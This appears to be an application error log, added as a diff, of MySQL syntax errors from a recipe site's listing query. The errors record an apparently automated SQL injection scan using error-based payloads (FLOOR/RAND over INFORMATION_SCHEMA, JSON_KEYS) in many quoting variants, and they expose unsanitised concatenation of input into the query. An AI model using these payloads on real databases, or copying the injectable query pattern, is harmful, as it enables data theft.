@@ -1,0 +1,1207 @@
+Time : 16:44:06
+SQLSTATE[HY000]: General error: 1210 Incorrect arguments to mysqld_stmt_execute
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='news' AND d_class2=c_id AND (d_class2=? || 0=0) AND d_id=file_d_id AND file_type='newsCover' AND d_active=1 ORDER BY d_date DESC LIMIT ?, ?
+
+Time : 06:50:07
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '') WHERE 6388=6388 AND (SELECT 3440 FROM(SELECT COUNT(*),CONCAT(0x716a627871,(SE' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4') WHERE 6388=6388 AND (SELECT 3440 FROM(SELECT COUNT(*),CONCAT(0x716a627871,(SELECT (ELT(3440=3440,1))),0x717a766b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)-- mYJW=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:50:05
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" AND (SELECT 3440 FROM(SELECT COUNT(*),CONCAT(0x716a627871,(SELECT (ELT(3440=34' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4" AND (SELECT 3440 FROM(SELECT COUNT(*),CONCAT(0x716a627871,(SELECT (ELT(3440=3440,1))),0x717a766b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND "lENH" LIKE "lENH=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:50:05
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"))) AND (SELECT 3440 FROM(SELECT COUNT(*),CONCAT(0x716a627871,(SELECT (ELT(3440' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4"))) AND (SELECT 3440 FROM(SELECT COUNT(*),CONCAT(0x716a627871,(SELECT (ELT(3440=3440,1))),0x717a766b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND ((("UkmO" LIKE "UkmO=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:50:04
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '")) AND (SELECT 3440 FROM(SELECT COUNT(*),CONCAT(0x716a627871,(SELECT (ELT(3440=' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4")) AND (SELECT 3440 FROM(SELECT COUNT(*),CONCAT(0x716a627871,(SELECT (ELT(3440=3440,1))),0x717a766b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND (("nhZw" LIKE "nhZw=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:50:04
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '") AND (SELECT 3440 FROM(SELECT COUNT(*),CONCAT(0x716a627871,(SELECT (ELT(3440=3' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4") AND (SELECT 3440 FROM(SELECT COUNT(*),CONCAT(0x716a627871,(SELECT (ELT(3440=3440,1))),0x717a766b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND ("CMKg" LIKE "CMKg=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:50:04
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" AND (SELECT 3440 FROM(SELECT COUNT(*),CONCAT(0x716a627871,(SELECT (ELT(3440=34' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4" AND (SELECT 3440 FROM(SELECT COUNT(*),CONCAT(0x716a627871,(SELECT (ELT(3440=3440,1))),0x717a766b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND "rGEp"="rGEp=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:50:04
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"))) AND (SELECT 3440 FROM(SELECT COUNT(*),CONCAT(0x716a627871,(SELECT (ELT(3440' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4"))) AND (SELECT 3440 FROM(SELECT COUNT(*),CONCAT(0x716a627871,(SELECT (ELT(3440=3440,1))),0x717a766b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND ((("YMod"="YMod=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:50:03
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '")) AND (SELECT 3440 FROM(SELECT COUNT(*),CONCAT(0x716a627871,(SELECT (ELT(3440=' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4")) AND (SELECT 3440 FROM(SELECT COUNT(*),CONCAT(0x716a627871,(SELECT (ELT(3440=3440,1))),0x717a766b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND (("oUHD"="oUHD=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:50:03
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '") AND (SELECT 3440 FROM(SELECT COUNT(*),CONCAT(0x716a627871,(SELECT (ELT(3440=3' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4") AND (SELECT 3440 FROM(SELECT COUNT(*),CONCAT(0x716a627871,(SELECT (ELT(3440=3440,1))),0x717a766b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND ("vpaH"="vpaH=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:50:03
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' AND (SELECT 3440 FROM(SELECT COUNT(*),CONCAT(0x716a627871,(SELECT (ELT(3440=34' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4' AND (SELECT 3440 FROM(SELECT COUNT(*),CONCAT(0x716a627871,(SELECT (ELT(3440=3440,1))),0x717a766b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'SaMw' LIKE 'SaMw=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:50:03
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''))) AND (SELECT 3440 FROM(SELECT COUNT(*),CONCAT(0x716a627871,(SELECT (ELT(3440' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4'))) AND (SELECT 3440 FROM(SELECT COUNT(*),CONCAT(0x716a627871,(SELECT (ELT(3440=3440,1))),0x717a766b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND ((('wqcq' LIKE 'wqcq=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:50:02
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '')) AND (SELECT 3440 FROM(SELECT COUNT(*),CONCAT(0x716a627871,(SELECT (ELT(3440=' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4')) AND (SELECT 3440 FROM(SELECT COUNT(*),CONCAT(0x716a627871,(SELECT (ELT(3440=3440,1))),0x717a766b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND (('HrJD' LIKE 'HrJD=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:50:02
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '') AND (SELECT 3440 FROM(SELECT COUNT(*),CONCAT(0x716a627871,(SELECT (ELT(3440=3' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4') AND (SELECT 3440 FROM(SELECT COUNT(*),CONCAT(0x716a627871,(SELECT (ELT(3440=3440,1))),0x717a766b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND ('wOvM' LIKE 'wOvM=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:50:02
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' AND (SELECT 3440 FROM(SELECT COUNT(*),CONCAT(0x716a627871,(SELECT (ELT(3440=34' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4' AND (SELECT 3440 FROM(SELECT COUNT(*),CONCAT(0x716a627871,(SELECT (ELT(3440=3440,1))),0x717a766b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'sqne'='sqne=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:50:02
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''))) AND (SELECT 3440 FROM(SELECT COUNT(*),CONCAT(0x716a627871,(SELECT (ELT(3440' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4'))) AND (SELECT 3440 FROM(SELECT COUNT(*),CONCAT(0x716a627871,(SELECT (ELT(3440=3440,1))),0x717a766b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND ((('DzxT'='DzxT=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:50:01
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '')) AND (SELECT 3440 FROM(SELECT COUNT(*),CONCAT(0x716a627871,(SELECT (ELT(3440=' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4')) AND (SELECT 3440 FROM(SELECT COUNT(*),CONCAT(0x716a627871,(SELECT (ELT(3440=3440,1))),0x717a766b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND (('tkyi'='tkyi=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:50:01
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '') AND (SELECT 3440 FROM(SELECT COUNT(*),CONCAT(0x716a627871,(SELECT (ELT(3440=3' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4') AND (SELECT 3440 FROM(SELECT COUNT(*),CONCAT(0x716a627871,(SELECT (ELT(3440=3440,1))),0x717a766b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND ('zfmT'='zfmT=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:50:01
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" AND (SELECT 3440 FROM(SELECT COUNT(*),CONCAT(0x716a627871,(SELECT (ELT(3440=34' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4" AND (SELECT 3440 FROM(SELECT COUNT(*),CONCAT(0x716a627871,(SELECT (ELT(3440=3440,1))),0x717a766b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)-- qPYS=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:50:00
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' AND (SELECT 3440 FROM(SELECT COUNT(*),CONCAT(0x716a627871,(SELECT (ELT(3440=34' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4' AND (SELECT 3440 FROM(SELECT COUNT(*),CONCAT(0x716a627871,(SELECT (ELT(3440=3440,1))),0x717a766b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)-- hwDi=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:50:00
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '') AND (SELECT 3440 FROM(SELECT COUNT(*),CONCAT(0x716a627871,(SELECT (ELT(3440=3' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4') AND (SELECT 3440 FROM(SELECT COUNT(*),CONCAT(0x716a627871,(SELECT (ELT(3440=3440,1))),0x717a766b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)-- hhxa=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:50:00
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '`) WHERE 7947=7947 AND (SELECT 3440 FROM(SELECT COUNT(*),CONCAT(0x716a627871,(SE' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4`) WHERE 7947=7947 AND (SELECT 3440 FROM(SELECT COUNT(*),CONCAT(0x716a627871,(SELECT (ELT(3440=3440,1))),0x717a766b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)-- uIPS=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:59
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '` WHERE 9463=9463 AND (SELECT 3440 FROM(SELECT COUNT(*),CONCAT(0x716a627871,(SEL' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4` WHERE 9463=9463 AND (SELECT 3440 FROM(SELECT COUNT(*),CONCAT(0x716a627871,(SELECT (ELT(3440=3440,1))),0x717a766b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)-- gyFX=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:59
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'AS bTea WHERE 7259=7259 AND (SELECT 3440 FROM(SELECT COUNT(*),CONCAT(0x716a62787' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4) AS bTea WHERE 7259=7259 AND (SELECT 3440 FROM(SELECT COUNT(*),CONCAT(0x716a627871,(SELECT (ELT(3440=3440,1))),0x717a766b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)-- zEjC=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:59
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ') AS xpBx WHERE 6921=6921 AND (SELECT 3440 FROM(SELECT COUNT(*),CONCAT(0x716a627' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4)) AS xpBx WHERE 6921=6921 AND (SELECT 3440 FROM(SELECT COUNT(*),CONCAT(0x716a627871,(SELECT (ELT(3440=3440,1))),0x717a766b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)-- NVBL=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:58
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'WHERE 2510=2510 AND (SELECT 3440 FROM(SELECT COUNT(*),CONCAT(0x716a627871,(SELEC' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4 WHERE 2510=2510 AND (SELECT 3440 FROM(SELECT COUNT(*),CONCAT(0x716a627871,(SELECT (ELT(3440=3440,1))),0x717a766b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)-- UmcV=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:58
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'WHERE 9932=9932 AND (SELECT 3440 FROM(SELECT COUNT(*),CONCAT(0x716a627871,(SELEC' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4) WHERE 9932=9932 AND (SELECT 3440 FROM(SELECT COUNT(*),CONCAT(0x716a627871,(SELECT (ELT(3440=3440,1))),0x717a766b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)-- peOn=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:58
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4 AND (SELECT 3440 FROM(SELECT COUNT(*),CONCAT(0x716a627871,(SELECT (ELT(3440=3440,1))),0x717a766b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)# jkwf=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:58
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4 AND (SELECT 3440 FROM(SELECT COUNT(*),CONCAT(0x716a627871,(SELECT (ELT(3440=3440,1))),0x717a766b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)-- fpuK=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:57
+SQLSTATE[21000]: Cardinality violation: 1242 Subquery returns more than 1 row
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4 AND (SELECT 3440 FROM(SELECT COUNT(*),CONCAT(0x716a627871,(SELECT (ELT(3440=3440,1))),0x717a766b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:57
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ')) AND (SELECT 3440 FROM(SELECT COUNT(*),CONCAT(0x716a627871,(SELECT (ELT(3440=3' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4))) AND (SELECT 3440 FROM(SELECT COUNT(*),CONCAT(0x716a627871,(SELECT (ELT(3440=3440,1))),0x717a766b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND (((9485=9485=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:57
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ') AND (SELECT 3440 FROM(SELECT COUNT(*),CONCAT(0x716a627871,(SELECT (ELT(3440=34' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4)) AND (SELECT 3440 FROM(SELECT COUNT(*),CONCAT(0x716a627871,(SELECT (ELT(3440=3440,1))),0x717a766b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND ((1250=1250=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:56
+SQLSTATE[21000]: Cardinality violation: 1242 Subquery returns more than 1 row
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4) AND (SELECT 3440 FROM(SELECT COUNT(*),CONCAT(0x716a627871,(SELECT (ELT(3440=3440,1))),0x717a766b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)-- HWsf=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:56
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' IN BOOLEAN MODE) OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SEL' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4' IN BOOLEAN MODE) OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(3129=3129,1))),0x717a766b71)) USING utf8)))#=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:56
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '") AS jmIg WHERE 6255=6255 OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4") AS jmIg WHERE 6255=6255 OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(3129=3129,1))),0x717a766b71)) USING utf8)))-- FHDb=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:56
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '') AS sRBG WHERE 5569=5569 OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4') AS sRBG WHERE 5569=5569 OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(3129=3129,1))),0x717a766b71)) USING utf8)))-- iHoV=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:55
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '")) AS HgBm WHERE 6261=6261 OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a62' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4")) AS HgBm WHERE 6261=6261 OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(3129=3129,1))),0x717a766b71)) USING utf8)))-- vetG=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:55
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '')) AS BVcB WHERE 2871=2871 OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a62' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4')) AS BVcB WHERE 2871=2871 OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(3129=3129,1))),0x717a766b71)) USING utf8)))-- zPVg=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:55
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''+(SELECT 'rDXJ' WHERE 1599=1599 OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4'+(SELECT 'rDXJ' WHERE 1599=1599 OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(3129=3129,1))),0x717a766b71)) USING utf8))))+'=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:55
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''+(SELECT PMWg WHERE 9690=9690 OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4'+(SELECT PMWg WHERE 9690=9690 OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(3129=3129,1))),0x717a766b71)) USING utf8))))+'=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:54
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''||(SELECT 'RIbH' WHERE 3351=3351 OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4'||(SELECT 'RIbH' WHERE 3351=3351 OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(3129=3129,1))),0x717a766b71)) USING utf8))))||'=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:54
